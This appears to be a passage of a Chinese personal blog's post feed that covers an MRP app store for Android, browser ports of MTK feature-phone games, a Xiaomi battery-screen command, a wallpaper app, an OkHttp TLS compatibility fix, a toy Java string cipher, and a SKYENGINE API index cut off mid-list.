        <content type="html"><![CDATA[<div id="txt_view">Mrp商店是一个在安卓设备上下载mrp程序的应用 </div> <a id="more"></a>  <blockquote><p>mrp介绍：mrp软件MRP格式游戏，是由【杭州斯凯网络科技有限公司】开发的一种轻量级的虚拟平台MINIJ平台格式文件，用标准的ANSI C编写。我们也可以说它是国产机专用游戏格式，MRP程序的应用范围还是比较广的，国内普遍的手机（包括国产的贴牌、杂牌、品牌，已及数量极其庞大的其它山寨机都带有这个平台) - 摘自<a href="https://baike.baidu.com/item/mrp软件" target="_blank" rel="noopener">百度百科</a></p></blockquote><p>Mrp商店是安卓平台上的mrp软件下载工具，收录了上千个mrp软件程序，提供软件介绍/截屏查看</p><p>软件特点 ：</p><ul><li>手机/Pad UI自适应</li><li>支持部分mrp游戏资源包下载</li><li>支持直接查看QQ保存的mrp文件</li><li>支持*#220807#键盘指令</li><li>支持mrp文件打开方式，可以从文件管理查看mrp信息</li><li>内置vmrp模拟器</li><li>内置常用模拟器下载</li><li>支持mrp编辑、解包、打包</li><li>支持小说mrp制作</li></ul><script>document.getElementById("txt_view").style.display = "none";</script><center><button onclick="down()">下载Mrp商店</button></center><script>function down(){    fetch('/data/MrpStoreUpdate.json')      .then(response => response.json())      .then(data => {          window.location.href = data.link;      })      .catch(console.error)}</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>F1赛车</title>
      <link href="/2023/f1-sai-che/"/>
      <url>/2023/f1-sai-che/</url>
      
        <content type="html"><![CDATA[<p>和魔法寿司一样，是MTK功能机上预装的一个小游戏  </p><a id="more"></a>  <center><canvas id="canvas" oncontextmenu="event.preventDefault()" width="256" height="256"></canvas></center><script type="text/javascript">var Module = {    canvas: (function() { return document.getElementById('canvas'); })()};</script><script src="F1-Race.js"></script><div id="keymap">    <div>        <center>            <button onclick="javascript:fireKeyEvent(document.getElementById('canvas'), 'keydown', 38)" style="line-height: 40px;width: 40px;margin: 5px;outline: none;">↑</button>        </center>    </div>    <div style="display: flex;justify-content: space-evenly;">        <center>            <button onclick="javascript:fireKeyEvent(document.getElementById('canvas'), 'keydown', 37)" style="line-height: 40px;width: 40px;margin: 5px;outline: none;">←</button>            <button onclick="javascript:fireKeyEvent(document.getElementById('canvas'), 'keydown', 32)" style="line-height: 40px;width: 40px;margin: 5px;outline: none;">fly</button>            <button onclick="javascript:fireKeyEvent(document.getElementById('canvas'), 'keydown', 39)" style="line-height: 40px;width: 40px;margin: 5px;outline: none;">→</button>        </center>    </div>    <div style="display: flex;justify-content: space-evenly;">        <center>            <button onclick="javascript:fireKeyEvent(document.getElementById('canvas'), 'keydown', 40)" style="line-height: 40px;width: 40px;margin: 5px;outline: none;">↓</button>        </center>    </div>    <br>    <center>        <button onclick="javascript:fireKeyEvent(document.getElementById('canvas'), 'keydown', 77)">音乐开关</button>        <button onclick="javascript:fireKeyEvent(document.getElementById('canvas'), 'keydown', 78)">切换bgm</button>        <button onclick="javascript:document.getElementById('live2d-widget').style.display='none'">隐藏看板娘</button>        <button onclick="javascript:document.getElementById('keymap').style.display='none'">隐藏按钮</button>    </center></div><script type="text/javascript">function fireKeyEvent(el, evtType, keyCode) {  var evtObj;  if (document.createEvent) {      if (window.KeyEvent) {//firefox 浏览器下模拟事件          evtObj = document.createEvent('KeyEvents');          evtObj.initKeyEvent(evtType, true, true, window, true, false, false, false, keyCode, 0);      } else {//chrome 浏览器下模拟事件          evtObj = document.createEvent('UIEvents');          evtObj.initUIEvent(evtType, true, true, window, 1);          delete evtObj.keyCode;          if (typeof evtObj.keyCode === "undefined") {//为了模拟keycode              Object.defineProperty(evtObj, "keyCode", { value: keyCode });                                 } else {              evtObj.key = String.fromCharCode(keyCode);          }          if (typeof evtObj.ctrlKey === 'undefined') {//为了模拟ctrl键              Object.defineProperty(evtObj, "ctrlKey", { value: true });          } else {              evtObj.ctrlKey = true;          }      }      el.dispatchEvent(evtObj);  } else if (document.createEventObject) {//IE 浏览器下模拟事件      evtObj = document.createEventObject();      evtObj.keyCode = keyCode      el.fireEvent('on' + evtType, evtObj);  }}</script><br><p>操作说明：<br>仅支持键盘操作（网页上的按钮仍有bug，建议使用键盘操作）</p><ul><li>方向键 按键2/4/6/8 ：控制方向</li><li>空格/按键5 ：飞行</li><li>按键tab/n/0 ：切换bgm</li><li>按键m/7 ：静音</li></ul><p>若博客内无法正常游戏，请查看原始页面<br><a href="F1-Race.html">F1-Race-WEB_v1.0.1</a>  </p><p>源代码：<a href="https://github.com/EXL/F1-Race" target="_blank" rel="noopener">https://github.com/EXL/F1-Race</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔法寿司</title>
      <link href="/2023/mo-fa-shou-si/"/>
      <url>/2023/mo-fa-shou-si/</url>
      
        <content type="html"><![CDATA[<p>魔法寿司，MTK功能机上的一个小游戏  </p><a id="more"></a>  <center><canvas id="canvas" oncontextmenu="event.preventDefault()" width="320" height="480"></canvas></center><script type="text/javascript">    var Module = {        canvas: (function() { return document.getElementById('canvas'); })()    };</script><script src="Magic-Sushi.js"></script><br><center><button onclick="javascript:fireKeyEvent(document.getElementById('canvas'), 'keydown', 77)">音乐开关</button><button onclick="javascript:document.getElementById('live2d-widget').style.display='none'">隐藏看板娘</button></center><script type="text/javascript">function fireKeyEvent(el, evtType, keyCode) {  var evtObj;  if (document.createEvent) {      if (window.KeyEvent) {//firefox 浏览器下模拟事件          evtObj = document.createEvent('KeyEvents');          evtObj.initKeyEvent(evtType, true, true, window, true, false, false, false, keyCode, 0);      } else {//chrome 浏览器下模拟事件          evtObj = document.createEvent('UIEvents');          evtObj.initUIEvent(evtType, true, true, window, 1);          delete evtObj.keyCode;          if (typeof evtObj.keyCode === "undefined") {//为了模拟keycode              Object.defineProperty(evtObj, "keyCode", { value: keyCode });                                 } else {              evtObj.key = String.fromCharCode(keyCode);          }          if (typeof evtObj.ctrlKey === 'undefined') {//为了模拟ctrl键              Object.defineProperty(evtObj, "ctrlKey", { value: true });          } else {              evtObj.ctrlKey = true;          }      }      el.dispatchEvent(evtObj);  } else if (document.createEventObject) {//IE 浏览器下模拟事件      evtObj = document.createEventObject();      evtObj.keyCode = keyCode      el.fireEvent('on' + evtType, evtObj);  }}</script><p>操作说明：<br>支持触屏和键鼠操作  </p><ul><li>方向键 按键2/4/6/8 ：控制方向</li><li>回车/空格/按键5 ：确定</li><li>按键m/7 ：静音</li></ul><p>若博客内无法正常游戏，请查看原始页面<br><a href="Magic-Sushi.html">Magic-Sushi-320x480-WEB_v1.0.0</a>  </p><p>源代码：<a href="https://github.com/EXL/Magic-Sushi" target="_blank" rel="noopener">https://github.com/EXL/Magic-Sushi</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打开小米电池续航界面</title>
      <link href="/2022/da-kai-xiao-mi-dian-chi-xu-hang-jie-mian/"/>
      <url>/2022/da-kai-xiao-mi-dian-chi-xu-hang-jie-mian/</url>
      
        <content type="html"><![CDATA[<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com<span class="selector-class">.miui</span>.powerkeeper/com<span class="selector-class">.miui</span><span class="selector-class">.powerkeeper</span><span class="selector-class">.ui</span><span class="selector-class">.powertools</span><span class="selector-class">.module</span><span class="selector-class">.batterylife</span>.BatteryStatusActivity</span><br></pre></td></tr></table></figure><a id="more"></a>  <p>简单打包了个apk快速使用<br>下载：<a href="https://res.gddhy.net/apk/midc.apk" target="_blank" rel="noopener">电池续航apk</a>  </p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(Intent.ACTION_VIEW);</span><br><span class="line">intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">intent.setClassName(<span class="string">"com.miui.powerkeeper"</span>,<span class="string">"com.miui.powerkeeper.ui.powertools.module.batterylife.BatteryStatusActivity"</span>);</span><br><span class="line">startActivity(Intent.createChooser(intent,getResources().getString(R.string.app_name)));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>随机壁纸</title>
      <link href="/2022/sui-ji-bi-zhi/"/>
      <url>/2022/sui-ji-bi-zhi/</url>
      
        <content type="html"><![CDATA[<p>一个以前制作的小软件，随机从手机里获取一张图片设置为壁纸   </p><a id="more"></a>  <p>长时间不更新被酷安下架了，看酷安上还有人一直用着，在这里分享下</p><p>v1.3 这个是之前在酷安上加的版本，只能选择一个本地目录，从里面随机获取图片设置为壁纸 <a href="https://res.gddhy.net/apk/sjbz/v1.3.apk" target="_blank" rel="noopener">下载</a></p><p>v1.4 应酷友要求更新的版本，增加了定时切换和从网络获取壁纸 <a href="https://res.gddhy.net/apk/sjbz/v1.4.apk" target="_blank" rel="noopener">下载</a></p><p>v1.4酷友<a href="http://www.coolapk.com/u/701732" target="_blank" rel="noopener">@何以叙南过</a> 修改的版本：添加​30+在线壁纸API接口，3万+各种类壁纸。可以方便切换<br>修改版下载：<a href="http://singkar.cn/sjbz/" target="_blank" rel="noopener">http://singkar.cn/sjbz/</a><br><a href="http://xkai.cc/sjbz" target="_blank" rel="noopener">http://xkai.cc/sjbz</a> <a href="http://92kj.cn/sjbz" target="_blank" rel="noopener">http://92kj.cn/sjbz</a></p><p>还有另一个版本 真•随机壁纸 不能指定本机目录，随机从相册抽一张图片作为壁纸 <a href="https://res.gddhy.net/apk/sjbz/wallpaper.apk" target="_blank" rel="noopener">下载</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OkHttp之javax.net.ssl.SSLHandshakeException</title>
      <link href="/2022/okhttp-zhi-javax-net-ssl-sslhandshakeexception/"/>
      <url>/2022/okhttp-zhi-javax-net-ssl-sslhandshakeexception/</url>
      
        <content type="html"><![CDATA[<p>自制的一个程序mrp商店，在低版本安卓上用okhttp发起网络请求会抛出异常，一头雾水，搜到这个解决办法  </p><a id="more"></a>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Https 异常：javax.net.ssl.SSLHandshakeException: Handshake failed</span></span><br><span class="line"><span class="comment">// Caused by: javax.net.ssl.SSLProtocolException: SSL handshake aborted: ssl=0x7a59e45208: Failure in SSL library, usually a protocol error</span></span><br><span class="line"><span class="comment">// 解决在Android5.0版本以下https无法访问（亲测5.0以上版本也报同样的错误，猜测应该通过服务器配置协议兼容可以解决，目前是Android端自己做了兼容）</span></span><br><span class="line">ConnectionSpec spec = <span class="keyword">new</span> ConnectionSpec.<span class="constructor">Builder(ConnectionSpec.COMPATIBLE_TLS)</span></span><br><span class="line">        .tls<span class="constructor">Versions(TlsVersion.TLS_1_2, TlsVersion.TLS_1_1, TlsVersion.TLS_1_0)</span></span><br><span class="line">        .all<span class="constructor">EnabledCipherSuites()</span></span><br><span class="line">        .build<span class="literal">()</span>;</span><br><span class="line"><span class="comment">// 兼容http接口</span></span><br><span class="line">ConnectionSpec spec1 = <span class="keyword">new</span> ConnectionSpec.<span class="constructor">Builder(ConnectionSpec.CLEARTEXT)</span>.build<span class="literal">()</span>;</span><br><span class="line">okHttpClientBuilder.connection<span class="constructor">Specs(Arrays.<span class="params">asList</span>(<span class="params">spec</span>, <span class="params">spec1</span>)</span>);</span><br></pre></td></tr></table></figure><p>应该是安卓5.0以下设备和华为部分设备能碰到这个问题</p><p>解决方法来源 <a href="https://www.jianshu.com/p/031d8aac0aba" target="_blank" rel="noopener">https://www.jianshu.com/p/031d8aac0aba</a></p><p><a href="https://www.jianshu.com/p/64499bdf6842" target="_blank" rel="noopener">https://www.jianshu.com/p/64499bdf6842</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java字符串的加密算法</title>
      <link href="/2022/java-zi-fu-chuan-de-jia-mi-suan-fa/"/>
      <url>/2022/java-zi-fu-chuan-de-jia-mi-suan-fa/</url>
      
        <content type="html"><![CDATA[<p>使用一个字符串 password 作为密码对另一个字符串 sourceString 进行加密  </p><a id="more"></a>  <p>EncryptAndDecrypt.java</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package stringEncrypt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EncryptAndDecrypt</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">String</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">String</span> sourceString, <span class="keyword">String</span> password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] p = password.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> n = p.length;</span><br><span class="line">        <span class="keyword">char</span>[] c = sourceString.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> m = c.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; m; k++) &#123;</span><br><span class="line">            <span class="keyword">int</span> mima = c[k] + p[k % n]; <span class="comment">//加密</span></span><br><span class="line">            c[k] = (<span class="keyword">char</span>)mima;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">String</span>(c);   <span class="comment">//返回密文</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">String</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">String</span> sourceString, <span class="keyword">String</span> password)</span> </span>&#123;  <span class="comment">//解密算法</span></span><br><span class="line">        <span class="keyword">char</span>[] p = password.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> n = p.length;</span><br><span class="line">        <span class="keyword">char</span>[] c = sourceString.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> m = c.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; m; k++) &#123;</span><br><span class="line">            <span class="keyword">int</span> yuan = c[k] - p[k % n];</span><br><span class="line">            c[k] = (<span class="keyword">char</span>)yuan;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">String</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StringEncryptTest.java</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package stringEncrypt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> StringEncryptTest &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main (String args[]) &#123;</span><br><span class="line">        String sourceString = "今晚十点进攻";</span><br><span class="line">        EncryptAndDecrypt person = <span class="built_in">new</span> EncryptAndDecrypt();</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("输入密码加密：" + sourceString);</span><br><span class="line">        Scanner <span class="keyword">inTo</span> = <span class="built_in">new</span> Scanner(<span class="keyword">System</span>.<span class="keyword">in</span>);</span><br><span class="line">        String <span class="keyword">password</span> = <span class="keyword">inTo</span>.nextLine();</span><br><span class="line">        String secret = person.encrypt(sourceString, <span class="keyword">password</span>);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("密文：" + secret);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("输入解密密码");</span><br><span class="line">        <span class="keyword">password</span> = <span class="keyword">inTo</span>.nextLine();</span><br><span class="line">        String source = person.decrypt(secret, <span class="keyword">password</span>);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("明文：" + source);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行这个测试程序就能看到结果</p><blockquote><p>转载 <a href="https://blog.csdn.net/qq_43763494/article/details/104199789" target="_blank" rel="noopener">【Java】字符串的加密算法 - Earnest～</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SKYENGINE API 参考手册</title>
      <link href="/2022/skyengine-api/"/>
      <url>/2022/skyengine-api/</url>
      
        <content type="html"><![CDATA[<p>这是斯凯平台的开发文档，简单整理了下，适合在手机上打开阅读  </p><a id="more"></a><ul><li><a href="introduction.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> SKYENGINE 简介</a></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> SKYENGINE 运行机制</summary><ul><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 启动流程</a></li><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 文件系统</a></li><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 网络模型</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> SKYENGINE 移植</summary><ul><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 系统要求</a></li><li><a href="$$unsavedpage.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 移植步骤</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 外部移植接口</summary><a style="PADDING-LEFT: 20px" href="外部移植接口.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 外部移植接口</a><ul><li><a href="mr_start_dsm.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_start_dsm</a></li><li><a href="mr_start_dsmB.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_start_dsmB</a></li><li><a href="mr_start_dsmC.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_start_dsmC</a></li><li><a href="mr_start_dsm_ex.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_start_dsm_ex</a></li><li><a href="mr_stop.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_stop</a></li><li><a href="mr_pauseApp.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_pauseApp</a></li><li><a href="mr_resumeApp.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_resumeApp</a></li><li><a href="mr_event.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_event</a></li><li><a href="mr_timer.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_timer</a></li><li><a href="mr_smsIndiaction.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_smsIndiaction</a></li><li><a href="mr_save_mrp.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_save_mrp</a></li><li><a href="mr_newSIMInd.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_newSIMInd</a></li><li><a href="mr_registerAPP.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_registerAPP</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 抽象移植接口</summary><a style="PADDING-LEFT: 20px" href="abstract_api.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 抽象移植接口</a><ul><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 输出接口</summary><ul><li><a href="mr_drawBitmap.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_drawBitmap</a></li><li><a href="mr_getCharBitmap.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_getCharBitmap</a></li><li><a href="mr_getScreenInfo.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_getScreenInfo</a></li><li><a href="mr_startShake.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_startShake</a></li><li><a href="mr_playSound.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_playSound</a></li><li><a href="mr_stopSound.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_stopSound</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 定时器接口</summary><ul><li><a href="mr_timerStart.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_timerStart</a></li><li><a href="mr_timerStop.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_timerStop</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 文件系统接口</summary><ul><li><a href="mr_getLen.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_getLen</a></li><li><a href="mr_open.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_open</a></li><li><a href="mr_read.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_read</a></li><li><a href="mr_write.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_write</a></li><li><a href="mr_close.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_close</a></li><li><a href="mr_info.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_info</a></li><li><a href="mr_seek.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_seek</a></li><li><a href="mr_remove.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_remove</a></li><li><a href="mr_rename.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_rename</a></li><li><a href="mr_mkDir.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_mkDir</a></li><li><a href="mr_rmDir.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_rmDir</a></li><li><a href="mr_findStart.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_findStart</a></li><li><a href="mr_findGetNext.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_findGetNext</a></li><li><a href="mr_findStop.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_findStop</a></li><li><a href="mr_ferrno.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_ferrno</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 通信接口</summary><ul><li><a href="mr_sendSms.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_sendSms</a></li><li><a href="mr_call.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_call</a></li><li><a href="mr_connectWAP.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_connectWAP</a></li><li><a href="mr_getNetworkID.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_getNetworkID</a></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 网络接口</summary><ul><li><a href="mr_initNetwork.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_initNetwork</a></li><li><a href="mr_closeNetwork.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_closeNetwork</a></li><li><a href="mr_getHostByName.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_getHostByName</a></li><li><a href="mr_socket.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_socket</a></li><li><a href="mr_connect.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_connect</a></li><li><a href="mr_closeSocket.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_closeSocket</a></li><li><a href="mr_recv.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_recv</a></li><li><a href="mr_send.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_send</a></li><li><a href="mr_recvfrom.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_recvfrom</a></li><li><a href="mr_sendto.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_sendto</a></li></ul></details></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 本地UI接口</summary><ul><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 菜单接口</summary><ul><li><a href="mr_menuCreate.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_menuCreate</a></li><li><a href="mr_menuSetItem.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_menuSetItem</a></li><li><a href="mr_menuShow.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_menuShow</a></li><li><a href="mr_menuRelease.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_menuRelease</a></li><li><a href="mr_menuRefresh.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_menuRefresh</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 对话框接口</summary><ul><li><a href="mr_dialogCreate.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_dialogCreate</a></li><li><a href="mr_dialogRefresh.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_dialogRefresh</a></li><li><a href="mr_dialogRelease.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_dialogRelease</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 文本框接口</summary><ul><li><a href="mr_textCreate.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_textCreate</a></li><li><a href="mr_textRefresh.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_textRefresh</a></li><li><a href="mr_textRelease.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_textRelease</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 编辑框接口</summary><ul><li><a href="mr_editCreate.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_editCreate</a></li><li><a href="mr_editRelease.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_editRelease</a></li><li><a href="mr_editGetText.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_editGetText</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 可扩展窗体接口</summary><ul><li><a href="mr_winCreate.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_winCreate</a></li><li><a href="mr_winRelease.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_winRelease</a></li></ul></details></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 其他系统基本接口</summary><ul><li><a href="mr_printf.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_printf</a></li><li><a href="mr_mem_get.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_mem_get</a></li><li><a href="mr_mem_free.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_mem_free</a></li><li><a href="mr_exit.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_exit</a></li><li><a href="mr_getTime.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_getTime</a></li><li><a href="mr_getDatetime.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_getDatetime</a></li><li><a href="mr_getUserInfo.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_getUserInfo</a></li><li><a href="mr_sleep.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_sleep</a></li></ul></details></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 扩展接口(mr_plat/mr_platEx)</summary><a style="PADDING-LEFT: 20px" href="扩展接口.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 扩展接口(mr_plat/mr_platEx)</a><ul><li><a href="mr_plat.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat</a></li><li><a href="mr_platEx.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx</a></li><li><a href="code.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> code 定义</a></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 展讯平台专有接口</summary><ul><li><a href="mr_plat(1).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1) - 调节CPU频率</a></li><li><a href="mr_plat(2).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2) - 获取平台可映射虚拟键数</a></li><li><a href="mr_plat(3).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(3) - 获取虚拟键状态</a></li><li><a href="mr_plat(4).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4) - nes特殊操作</a></li><li><a href="mr_plat(5).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(5) - 保存模拟器游戏积分</a></li><li><a href="mr_plat(6).htm"><i class="fa 